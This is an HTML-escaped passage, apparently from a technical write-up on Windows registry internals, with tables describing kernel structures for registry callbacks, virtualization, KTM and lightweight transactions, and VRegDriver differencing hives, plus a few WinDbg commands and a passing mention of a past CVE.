 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;The structure represents a single registry callback registered through the &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-cmregistercallback&quot;&gt;CmRegisterCallback&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-cmregistercallbackex&quot;&gt;CmRegisterCallbackEx&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API. Once allocated, it is attached to a double-linked list represented by the global &lt;/span&gt;&lt;span&gt;CallbackListHead &lt;/span&gt;&lt;span&gt;object.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c3&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c9&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Object context descriptor &lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;A&lt;/span&gt;&lt;span&gt;&amp;nbsp;descriptor structure for a key body-specific context that can be assigned through the &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-cmsetcallbackobjectcontext&quot;&gt;CmSetCallbackObjectContext&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API. This descriptor is then inserted into a linked list that starts at _CM_KEY_BODY.ContextListHead.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c3&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c9&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Callback context &lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;A&lt;/span&gt;&lt;span&gt;n internal structure used in the CmpCallCallBacksEx function to store the current state during the callback invocation process.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For example, it&amp;#39;s used to invoke the appropriate &amp;quot;post&amp;quot; type callbacks in case of an error in one of the &amp;quot;pre&amp;quot; type callbacks.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These objects are freed by the dedicated CmpFreeCallbackContext function, which additionally caches a certain number of allocations in the global CmpCallbackContextSList list.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This allows future requests for objects of this type to be quickly fulfilled.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;h3 class=&quot;tTszyzmaCA-c13 tTszyzmaCA-c31&quot; id=&quot;h.8qg7wep9banv&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c16 tTszyzmaCA-c4&quot;&gt;Registry virtualization&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;tTszyzmaCA-c38&quot;&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c43&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;In PDB&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;Structure name&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c53 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;Description&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c3&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c9&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Replication stack &lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c53&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;A&lt;/span&gt;&lt;span&gt;&amp;nbsp;core task of registry virtualization is the replication of keys, which involves creating an identical copy of a given key structure.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This occurs under the path HKU\&amp;lt;SID&amp;gt;_Classes\VirtualStore when an application, subject to virtualization, attempts to create a key in a location where it lacks proper permissions.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The entire operation is coordinated by the CmpReplicateKeyToVirtual function and consists of two main stages.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;First, a &amp;quot;replication stack&amp;quot; object is created and initialized in the CmpBuildVirtualReplicationStack function.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This object specifies the precise key structure to be created within the virtualization process.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Second, the actual creation of these keys based on this object occurs within the CmpDoBuildVirtualStack function.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;h3 class=&quot;tTszyzmaCA-c31 tTszyzmaCA-c13&quot; id=&quot;h.6im1ykq6lzaz&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c16 tTszyzmaCA-c4&quot;&gt;Transactions&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;tTszyzmaCA-c38&quot;&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c43&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;In PDB&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;Structure name&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c53 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;Description&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c3&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#9989;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c9&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;_KTRANSACTION &lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c53&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;A&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure corresponding to a KTM transaction object, which is created by the &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/ktmw32/nf-ktmw32-createtransaction&quot;&gt;CreateTransaction&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;function or its low-level equivalent &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-ntcreatetransaction&quot;&gt;NtCreateTransaction&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c3&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c9&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Lightweight transaction object &lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c53&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;A&lt;/span&gt;&lt;span&gt;&amp;nbsp;direct counterpart of _KTRANSACTION, but for lightweight transactions, created by the NtCreateRegistryTransaction system call.&lt;/span&gt;&lt;span&gt;&amp;nbsp;It is very simple and only &lt;/span&gt;&lt;span&gt;consists of a bitmask of the current transaction state, a push lock for synchronization, and a pointer to the corresponding _CM_TRANS object.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c3&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#9989;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c9&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;_CM_KCB_UOW&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c53&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;The&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure represents a single, active transactional operation linked to a specific key.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In some scenarios, one logical operation corresponds to one such object (e.g., the UoWSetSecurityDescriptor type).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In other cases, multiple UoWs are created for a single operation (e.g., UoWAddThisKey assigned to a newly created key, and UoWAddChildKey assigned to its parent).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;This critical structure has multiple functions.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The key ones are connecting to KCB intent locks and keeping any pending state related to a given operation, both before and during the transaction commit phase.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c3&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#9989;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c9&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;_CM_UOW_*&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c53&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;A&lt;/span&gt;&lt;span&gt;uxiliary sub-structures of _CM_KCB_UOW, which store information about the temporary state of the registry associated with a specific type of transactional operation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Specifically, the four structures are&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt;&amp;nbsp;_CM_UOW_KEY_STATE_MODIFICATION&lt;/span&gt;&lt;span&gt;, _CM_UOW_SET_SD_DATA, _CM_UOW_SET_VALUE_KEY_DATA and _CM_UOW_SET_VALUE_LIST_DATA.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c3&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#9989;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c9&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;_CM_TRANS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c53&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;A&lt;/span&gt;&lt;span&gt;&amp;nbsp;descriptor of a specific registry transaction, usually associated with a particular hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In special cases, if operations are performed on multiple hives within a single transaction, then multiple &amp;nbsp;_CM_TRANS objects may exist for it.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Given the address of the _CM_TRANS object, it is possible to list all operations associated with this transaction in WinDbg using the !reg uowlist command.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c3&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#9989;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c9&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;_CM_RM&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c53&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;A&lt;/span&gt;&lt;span&gt;&amp;nbsp;descriptor of a specific &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c44&quot;&gt;resource manager&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It only exists if the given hive has KTM transactions enabled&lt;/span&gt;&lt;span&gt;, and &lt;/span&gt;&lt;span&gt;never exists for app hives or hives loaded with the REG_HIVE_NO_RM flag.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;Think of this structure as being associated with one set of .blf / .regtrans-ms log files, which usually means one _CM_RM structure is assigned to one hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The exception is system hives (e.g. SOFTWARE, SYSTEM etc.) which all share the same resource manager that exists under the CmRmSystem global variable.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;Given the address of a _CM_RM object in WinDbg, you can list all associated transactions using the !reg translist command.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c3&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#9989;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c9&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;_CM_INTENT_LOCK&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c53&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;This structure represents an intent lock, with two instances (KCBLock and KeyLock) residing in the KCB. Their primary function is to ensure key consistency by preventing the assignment of two different transactions that contain conflicting modifications of a key.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Given the object&amp;#39;s address, WinDbg&amp;#39;s !reg ixlock command &lt;/span&gt;&lt;span&gt;can &lt;/span&gt;&lt;span&gt;display some details about it.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c3&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c9&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Serialized log records&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c53&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;KTM transacted registry operations are logged to .blf files on disk to enable consistent state restoration in case of unexpected shutdown during transaction commit.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The CmAddLogForAction function serializes the _CM_KCB_UOW object into a flat buffer and writes it to the log file using the CLFS interface.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;While the _CM_KCB_UOW structure can be found in public symbols, their corresponding serialized representations cannot.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Notably, there was an information disclosure vulnerability (&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451559&quot;&gt;CVE-2023-28271&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) that was directly related to these structures.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c3&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c9&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Rollback packet &lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c53&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;When a client performs a non-transactional operation that modifies a key, and there&amp;#39;s an active transaction associated with that key, the transaction must be rolled back before the operation can be executed to prevent an inconsistent state.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is achieved using a structure that contains a list of transactions to be rolled back.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This structure is passed to the CmpAbortRollbackPacket function, which carries out the rollback.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Although the official layout of this structure is unknown, in practice it is quite simple, consisting of three fields: the current capacity, the current fill level of the list, and a pointer to a dynamically allocated array of transactions.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;h3 class=&quot;tTszyzmaCA-c31&quot; id=&quot;h.wan5b92mdzn&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c16 tTszyzmaCA-c4&quot;&gt;Differencing hives (VRegDriver)&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;tTszyzmaCA-c38&quot;&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c43&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;In PDB&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;Structure name&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c24 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;Description&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c20&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c39&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;#10060;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c26&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;IOCTL input structures&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;The VRegDriver module works by creating the \Device\VRegDriver device, and communicates with its clients by supporting nine distinct IOCTLs within the corresponding VrpIoctlDeviceDispatch handler function.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These IOCTLs, exclusively accessible to administrator users, facilitate loading and unloading differencing hives, configuring registry redirections for specific containers, and a few other operations.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Each IOCTL requires a specific input data structure, none of which are officially documented.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, practical use of this interface necessitates reverse engineering the required structures to understand their initialization.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;An example of a reversed structure, corresponding to IOCTL 0x220008 and &lt;/span&gt;&lt;span&gt;provisionally&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;named VRP_LOAD_DIFFERENCING_HIVE_INPUT, was showcased in &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a 